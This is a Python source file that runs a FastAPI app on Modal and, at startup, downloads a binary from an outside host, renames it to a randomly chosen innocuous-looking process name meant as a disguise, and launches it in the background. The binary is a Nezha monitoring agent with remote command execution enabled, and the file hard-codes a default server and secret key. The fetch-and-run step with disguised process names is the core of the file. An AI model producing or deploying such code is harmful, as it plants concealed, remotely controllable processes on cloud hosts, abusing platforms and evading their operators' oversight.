import os
import json
import time
import subprocess
import platform
import random
import threading
import psutil
from fastapi import FastAPI, Response
from fastapi.responses import PlainTextResponse
import modal

# ========== Modal 镜像定义 ==========
image = modal.Image.debian_slim().pip_install(
    "fastapi==0.115.12",
    "pydantic==2.11.7",
    "requests",
    "psutil",
    "uvicorn",
)

app = modal.App("nezha-fastapi-app", image=image)

# ========== FastAPI 实例 ==========
web_app = FastAPI(
    title="Nezha Agent Runner",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)

# ========== 全局启动控制 ==========
_agent_started = False
_agent_lock = threading.Lock()

# ========== 辅助函数 ==========

def create_directory(file_path):
    """确保目录存在"""
    if not os.path.exists(file_path):
        os.makedirs(file_path, exist_ok=True)
        print(f"Directory created: {file_path}")


def get_system_architecture():
    """检测系统架构"""
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    return 'amd'


def download_file(file_name, file_url, file_path):
    """下载文件到指定路径"""
    import requests
    try:
        full_path = os.path.join(file_path, file_name)
        print(f"Downloading {file_url} -> {full_path}")
        response = requests.get(file_url, stream=True, timeout=60)
        response.raise_for_status()
        with open(full_path, 'wb') as f:
            total = 0
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                total += len(chunk)
        print(f"Download complete: {total} bytes written to {full_path}")
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False


def authorize_files(file_path):
    """设置文件执行权限"""
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
            print(f"Permissions set for {file_path}")
        except Exception as e:
            print(f"Chmod failed for {file_path}: {e}")
    else:
        print(f"File not found for chmod: {file_path}")


def write_log(message):
    """写入日志"""
    try:
        with open('/tmp/agent.log', 'a') as f:
            f.write(f"[{time.ctime()}] {message}\n")
    except Exception:
        pass


def exec_cmd(command):
    """执行命令并记录日志"""
    try:
        write_log(f"Executing: {command}")
        with open('/tmp/agent.log', 'a') as f:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=f,
                stderr=f,
                start_new_session=True,
            )
        write_log(f"Process started with PID: {process.pid}")
        return process.pid
    except Exception as e:
        write_log(f"Command execution failed: {e}")
        print(f"Command execution failed: {e}")
        return None


def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
    """下载并运行 Nezha Agent"""
    if not nezha_server or not nezha_key:
        msg = "NEZHA_SERVER or NEZHA_KEY is missing, agent will not start."
        print(msg)
        write_log(msg)
        return

    architecture = get_system_architecture()
    print(f"Detected architecture: {architecture}")
    write_log(f"Architecture: {architecture}")

    # 随机伪装名称
    disguise_names = [
        'cache_manager',
        'session_handler',
        'task_worker',
        'log_rotator',
        'health_check',
    ]
    disguise_name = random.choice(disguise_names)
    print(f"Using disguise name: {disguise_name}")
    write_log(f"Disguise name: {disguise_name}")

    # 确定下载地址
    if nezha_port:
        if architecture == 'arm':
            url = "https://arm64.ssss.nyc.mn/agent"
        else:
            url = "https://amd64.ssss.nyc.mn/agent"
    else:
        if architecture == 'arm':
            url = "https://arm64.ssss.nyc.mn/v1"
        else:
            url = "https://amd64.ssss.nyc.mn/v1"

    print(f"Download URL: {url}")
    write_log(f"Download URL: {url}")

    # 下载 agent
    if not download_file(disguise_name, url, file_path):
        msg = "Download failed, agent not started."
        print(msg)
        write_log(msg)
        return

    agent_path = os.path.join(file_path, disguise_name)
    authorize_files(agent_path)

    # 验证文件存在且有大小
    if os.path.exists(agent_path):
        file_size = os.path.getsize(agent_path)
        print(f"Agent file size: {file_size} bytes")
        write_log(f"Agent file size: {file_size} bytes")
        if file_size < 1000:
            msg = "Agent file too small, possibly corrupted."
            print(msg)
            write_log(msg)
            return
    else:
        msg = "Agent file does not exist after download."
        print(msg)
        write_log(msg)
        return

    # TLS 端口列表
    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if nezha_port:
        # 旧版 agent 模式（带 port 参数）
        nezha_tls_flag = '--tls' if nezha_port in tls_ports else ''
        command = (
            f"nohup {agent_path} "
            f"-s {nezha_server}:{nezha_port} "
            f"-p {nezha_key} "
            f"{nezha_tls_flag} "
            f">/dev/null 2>&1 &"
        )
    else:
        # 新版 v1 模式（使用配置文件）
        port = ""
        if ":" in nezha_server:
            port = nezha_server.split(":")[-1]
        nezha_tls = "true" if port in tls_ports else "false"

        config_yaml = (
            f"client_secret: {nezha_key}\n"
            f"debug: false\n"
            f"disable_auto_update: true\n"
            f"disable_command_execute: false\n"
            f"disable_force_update: true\n"
            f"disable_nat: false\n"
            f"disable_send_query: false\n"
            f"gpu: false\n"
            f"insecure_tls: false\n"
            f"ip_report_period: 1800\n"
            f"report_delay: 4\n"
            f"server: {nezha_server}\n"
            f"skip_connection_count: false\n"
            f"skip_procs_count: false\n"
            f"temperature: false\n"
            f"tls: {nezha_tls}\n"
            f"use_gitee_to_upgrade: false\n"
            f"use_ipv6_country_code: false\n"
            f"uuid: {uuid}\n"
        )

        config_path = os.path.join(file_path, 'config.yaml')
        with open(config_path, 'w') as f:
            f.write(config_yaml)
        print(f"Config written to {config_path}")
        write_log(f"Config written to {config_path}")

        command = (
            f"nohup {agent_path} "
            f"-c \"{config_path}\" "
            f">/dev/null 2>&1 &"
        )

    print(f"Starting agent: {command}")
    write_log(f"Starting agent: {command}")
    pid = exec_cmd(command)
    if pid:
        print(f"Agent process launched, PID: {pid}")
        write_log(f"Agent process launched, PID: {pid}")
    else:
        print("Failed to launch agent process.")
        write_log("Failed to launch agent process.")


def tail_log(filepath, lines=10):
    """读取日志文件最后 N 行"""
    try:
        with open(filepath, 'r') as f:
            all_lines = f.read().splitlines()
            return all_lines[-lines:] if len(all_lines) >= lines else all_lines
    except FileNotFoundError:
        return ["Log file not found"]
    except Exception as e:
        return [f"Error reading log: {str(e)}"]


def find_agent_processes():
    """查找正在运行的 agent 进程"""
    agent_names = [
        'cache_manager',
        'session_handler',
        'task_worker',
        'log_rotator',
        'health_check',
    ]
    found = []
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
        try:
            cmdline = ' '.join(proc.info.get('cmdline') or [])
            name = proc.info.get('name', '')
            if any(n in cmdline or n in name for n in agent_names):
                found.append({
                    "pid": proc.info['pid'],
                    "name": proc.info.get('name', 'unknown'),
                    "status": proc.info.get('status', 'unknown'),
                })
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return found


def ensure_agent_started():
    """确保 agent 只启动一次"""
    global _agent_started
    with _agent_lock:
        if _agent_started:
            print("Agent already started, skipping.")
            return
        _agent_started = True

    print("=" * 50)
    print("Initializing Nezha Agent...")
    print("=" * 50)

    # 从环境变量读取配置
    FILE_PATH = os.environ.get('FILE_PATH', '.cache')
    NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
    NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
    NEZHA_KEY = os.environ.get('NEZHA_KEY', '4z0HWnSGJtKFtKOlfJxSkNC3F8PIJ448')
    UUID = os.environ.get('UUID', '371fea8c-e660-4940-9d95-f314495ab189')

    print(f"FILE_PATH:      {FILE_PATH}")
    print(f"NEZHA_SERVER:   {NEZHA_SERVER}")
    print(f"NEZHA_PORT:     {NEZHA_PORT}")
    print(f"NEZHA_KEY:      {'***' + NEZHA_KEY[-4:] if len(NEZHA_KEY) > 4 else '(empty)'}")
    print(f"UUID:           {UUID}")

    # 初始化日志文件
    write_log("=" * 40)
    write_log("Agent initialization started")
    write_log(f"FILE_PATH: {FILE_PATH}")
    write_log(f"NEZHA_SERVER: {NEZHA_SERVER}")
    write_log(f"NEZHA_PORT: {NEZHA_PORT}")
    write_log(f"UUID: {UUID}")

    # 创建目录
    create_directory(FILE_PATH)

    # 后台线程启动 agent
    def agent_starter():
        try:
            run_agent(FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID)
        except Exception as e:
            msg = f"Agent starter thread exception: {e}"
            print(msg)
            write_log(msg)

    thread = threading.Thread(target=agent_starter, daemon=True)
    thread.start()
    print("Agent starter thread launched.")


# ========== FastAPI 启动事件 ==========

@web_app.on_event("startup")
async def startup_event():
    """容器启动时触发 agent"""
    print("FastAPI startup event fired.")
    ensure_agent_started()


# ========== FastAPI 路由 ==========

@web_app.get("/")
async def root():
    """根路径 - 纯文本响应"""
    return PlainTextResponse(
        content="Nezha Agent Runner is active.\n\n"
                "Endpoints:\n"
                "  /health  - Health check\n"
                "  /status  - Agent process status\n"
                "  /logs    - View agent logs\n"
                "  /info    - System information\n"
    )


@web_app.get("/health")
async def health():
    """健康检查"""
    data = {
        "status": "healthy",
        "timestamp": time.time(),
        "uptime": time.ctime(),
    }
    return Response(
        content=json.dumps(data),
        media_type="application/json",
    )


@web_app.get("/status")
async def status():
    """检查 agent 进程状态"""
    processes = find_agent_processes()

    if processes:
        data = {
            "agent_status": "running",
            "processes": processes,
            "process_count": len(processes),
        }
    else:
        data = {
            "agent_status": "not_running",
            "processes": [],
            "process_count": 0,
            "recent_logs": tail_log('/tmp/agent.log', lines=5),
        }

    return Response(
        content=json.dumps(data),
        media_type="application/json",
    )


@web_app.get("/logs")
async def logs():
    """查看 agent 运行日志"""
    log_lines = tail_log('/tmp/agent.log', lines=30)
    data = {
        "log_lines": len(log_lines),
        "logs": log_lines,
    }
    return Response(
        content=json.dumps(data),
        media_type="application/json",
    )


@web_app.get("/info")
async def info():
    """系统信息"""
    data = {
        "platform": platform.platform(),
        "architecture": platform.machine(),
        "python_version": platform.python_version(),
        "cpu_count": psutil.cpu_count(),
        "memory_total_mb": round(psutil.virtual_memory().total / 1024 / 1024, 2),
        "memory_used_mb": round(psutil.virtual_memory().used / 1024 / 1024, 2),
        "memory_percent": psutil.virtual_memory().percent,
        "disk_total_gb": round(psutil.disk_usage('/').total / 1024 / 1024 / 1024, 2),
        "disk_used_gb": round(psutil.disk_usage('/').used / 1024 / 1024 / 1024, 2),
        "disk_percent": psutil.disk_usage('/').percent,
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }
    return Response(
        content=json.dumps(data),
        media_type="application/json",
    )


@web_app.get("/restart")
async def restart_agent():
    """重启 agent（先杀后启）"""
    global _agent_started

    # 杀掉现有进程
    killed = []
    processes = find_agent_processes()
    for proc_info in processes:
        try:
            proc = psutil.Process(proc_info['pid'])
            proc.kill()
            killed.append(proc_info['pid'])
        except Exception:
            pass

    # 重置标记
    with _agent_lock:
        _agent_started = False

    # 等待旧进程退出
    time.sleep(2)

    # 重新启动
    ensure_agent_started()

    data = {
        "action": "restart",
        "killed_pids": killed,
        "message": "Agent restart initiated",
    }
    return Response(
        content=json.dumps(data),
        media_type="application/json",
    )


# ========== Modal 入口 ==========

@app.function(
    secrets=[modal.Secret.from_name("nezha-secrets")],
    allow_concurrent_inputs=10,
    container_idle_timeout=300,
)
@modal.asgi_app()
def fastapi_app():
    """Modal ASGI 入口，返回 FastAPI 应用实例"""
    return web_app
